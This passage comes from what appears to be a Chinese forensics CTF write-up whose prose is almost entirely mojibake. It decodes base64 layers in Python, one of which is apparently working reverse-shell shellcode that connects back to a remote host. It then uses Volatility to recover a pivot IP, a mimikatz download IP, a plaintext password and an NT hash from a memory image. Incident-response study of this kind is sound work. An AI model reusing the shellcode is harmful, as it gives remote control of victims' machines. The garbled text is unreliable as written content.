HcEeItTfUGO45weH05FZsTsEfKRpuJeZrNGyDvbPwFZtmAPi6C1tWmB/KrJ/Is7B/0SnaYx3uYTXBZmzlk9kAbILPedhmMEM8umYn7pva7Zl7d6OIJ+7c9pWF6Xid9miGrXvReidUllMc0/OzVTW/Sh9YC6hUU/MJzd9qbLqdZoFNgP7Qsg4lqJekvX0nGieYafA8e8SEKI0Rgd4Pr4ND6sqEJA5rgbuWBf131xVZk55qpU+v/RK4o6Dw2BwPS5eXC/ASqkGZrY0Rin0a1KXtuSRBb5O2Ugvy/tev1knWBb+zVWfNEaA52ialbaGCPY7/6dvhf6MFbx8K1fgHeL0FHZwdQvmEcr4ragxAJUnIU/jKex2Z8Aw7AK0JN1+yd0/JETBwir4CCuxt8OSlUS286EL7rczZ1+YAPu5PmfO49oPdX2KTVGf4vFh8vvDY1H7f/Wc2piBoQo8haPfmeQOGfa48iXAZHcgEbz/YP4BPOT29hlcl9Ll/ADmiosV0DAA'''
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
compressed_data = base64.b64decode(base64_data)
with open("output.gz", "wb") as f:
    f.write(compressed_data)
print("ä¿å­˜æˆåŠŸ")
```

ã€€ã€€è§£å¯†ä¹‹åæ˜¯ä¸€ä¸ªoutput.gzå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸ªtest.txtæ–‡ä»¶ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223314-8a82j0j.png)â€‹

ã€€ã€€è¿™é‡Œåˆæ˜¯

ã€€ã€€â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223412-emoij8g.png)å†æ¬¡è§£å¯†ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š

```powershell
importÂ base64

base64_dataÂ =Â "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"
paddingÂ =Â '='Â *Â (4Â -Â len(base64_data)Â %Â 4)
base64_dataÂ +=Â padding
decoded_dataÂ =Â base64.b64decode(base64_data)
withÂ open('data.bin',Â 'wb')Â asÂ file:
Â Â Â Â file.write(decoded_data)
print("ä¿å­˜æˆåŠŸ")
```

ã€€ã€€è®¡ç®—md5å€¼ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109223735-6yzb1ya.png)â€‹

```powershell
flag{d72000ee7388d7d58960db277a91cc40}
```

ã€€ã€€â€

## å†…å­˜å–è¯

### è¿œç¨‹rdpè¿æ¥çš„è·³æ¿åœ°å€

ã€€ã€€â€

ã€€ã€€ä½¿ç”¨å†…å­˜åˆ†æå·¥å…·`volatility`â€‹ï¼ˆ`https://github.com/volatilityfoundation/volatility`â€‹ï¼‰æŸ¥çœ‹é•œåƒåŸºæœ¬ä¿¡æ¯ã€‚

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw imageinfo
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109231750-ujx5i3n.png)â€‹

ã€€ã€€ä½¿ç”¨å»ºè®®çš„ profileï¼šWin7SP1x64ã€‚åˆ†æ3389ç«¯å£ç½‘ç»œè¿æ¥æƒ…å†µï¼Œå®šä½åˆ°è·³æ¿åœ°å€IPï¼Œå¾—åˆ°flagã€‚

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232053-net9f6y.png)â€‹

```powershell
flag{192.168.60.220}
```

### æ”»å‡»è€…ä¸‹è½½é»‘å®¢å·¥å…·çš„IPåœ°å€

ã€€ã€€æŸ¥çœ‹å†å²cmdå‘½ä»¤ï¼Œæ‰¾åˆ°é»‘å®¢å·¥å…·mimikatzçš„ä¸‹è½½åœ°å€ã€‚

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232538-bfuztkn.png)â€‹

```powershell
flag{155.94.204.67}
```

### é»‘å®¢è·å–çš„â€œFusionManagerèŠ‚ç‚¹æ“ä½œç³»ç»Ÿå¸æˆ·ï¼ˆä¸šåŠ¡å¸æˆ·ï¼‰â€çš„å¯†ç æ˜¯ä»€ä¹ˆ

ã€€ã€€é€šè¿‡å†…å­˜åˆ†æ-2çš„cmdå†å²ï¼Œæ¨æµ‹æ”»å‡»è€…æŸ¥çœ‹äº†C:\\Users\\Administrator\\Desktop\\pass.txtå¯†ç æ–‡ä»¶ã€‚

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232701-jhhwre1.png)â€‹

ã€€ã€€ä½¿ç”¨`filescan`â€‹æ’ä»¶æ‰«ææ–‡ä»¶ï¼š é€šè¿‡Volatilityæ‰«æå†…å­˜è½¬å‚¨ï¼ŒæŸ¥æ‰¾`pass.txt`â€‹æ–‡ä»¶ã€‚

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan|findstr pass
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109232800-0rn10uz.png)â€‹

ã€€ã€€ä½¿ç”¨`dumpfiles`â€‹æ’ä»¶ä»å†…å­˜ä¸­æå–è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°flagã€‚

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233158-hzu5tpv.png)â€‹

```powershell
flag{GalaxManager_2012}
```

### æ”»å‡»è€…åˆ›å»ºçš„ç”¨æˆ·

ã€€ã€€Security.evtxè®°å½•å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ç™»å½•ã€æƒé™æ›´æ”¹ã€ç³»ç»Ÿç­–ç•¥ä¿®æ”¹ç­‰

ã€€ã€€æœç´¢ Security.evtx  æ—¥å¿—æ–‡ä»¶

```powershell
 .\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "Security.evtx"
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233332-ox9mtjr.png)â€‹

ã€€ã€€dump æ—¥å¿—æ–‡ä»¶

```powershell
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e744ba0 -D .
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109233527-z6s3n5d.png)â€‹

ã€€ã€€ä¿®æ”¹åç¼€ä¸º .evtx ,ä½¿ç”¨å·¥å…·åˆ†ææŸ¥çœ‹ä¸‹ï¼Œåˆ†æå¤±è´¥äº†ï¼ŒåŸå› æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶æœ‰æŸåï¼Œè¿™ä¸‹åªèƒ½æ‰‹åŠ¨æŸ¥çœ‹äº†ï¼š

ã€€ã€€æ‰¾åˆ°idä¸º 4720 ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234202-8bapjmj.png)â€‹

```powershell
flag{ASP.NET}
```

### æ”»å‡»è€…åˆ©ç”¨è·³æ¿rdpç™»å½•çš„æ—¶é—´

ã€€ã€€æ‰¾åˆ° idä¸º 4624 çš„æ—¥å¿—ï¼š

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234746-qwrfxw8.png)â€‹

```powershell
flag{2024/12/21 0:15:34}
```

### æ”»å‡»è€…åˆ›å»ºç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼

ã€€ã€€ä½¿ç”¨`hashdump`â€‹æ’ä»¶è·å–ç”¨æˆ·hashä¿¡æ¯ï¼Œå…¶ä¸­ASP.NETç”¨æˆ·çš„NTå“ˆå¸Œå€¼ä¸ºï¼š`5ffe97489cbec1e08d0c6339ec39416d`â€‹

```
.\volatility_2.6_win64_standalone.exe -f .\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
```

â€‹![image](https://cdn.jsdelivr.net/gh/AgonySec/Picture/siyuan/image-20250109234922-dllgdq9.png)â€‹

```powershell
flag{5ffe97489cbec1e08d0c6339ec39416d}
```
